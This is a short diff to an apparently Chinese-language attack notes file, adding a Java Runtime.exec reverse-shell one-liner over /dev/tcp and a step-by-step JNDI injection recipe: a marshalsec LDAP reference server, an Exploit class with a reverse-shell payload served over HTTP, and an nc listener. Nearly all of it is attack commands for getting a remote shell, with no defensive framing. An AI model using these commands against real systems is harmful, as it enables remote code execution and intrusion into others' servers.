@@ -37,5 +37,21 @@ https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
 
 执行系统命令：
 ```
-java.lang.Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/9999 0>&1"
+java.lang.Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/7777 0>&1")
+```
+
+
+### JNDI注入反弹shell
+
+1、开启LDAP服务，并指向另外一个开启HTTP服务的端口
+```bash
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8888/#Exploit
+```
+2、编译Exploit.java（静态代码块中写入反弹shell的payload），开启HTTP服务
+```bash
+python3 -m http.server 8888
+```
+3、监听某端口，接收反弹回来的shell
+```bash
+nc -klvn 7777
 ```
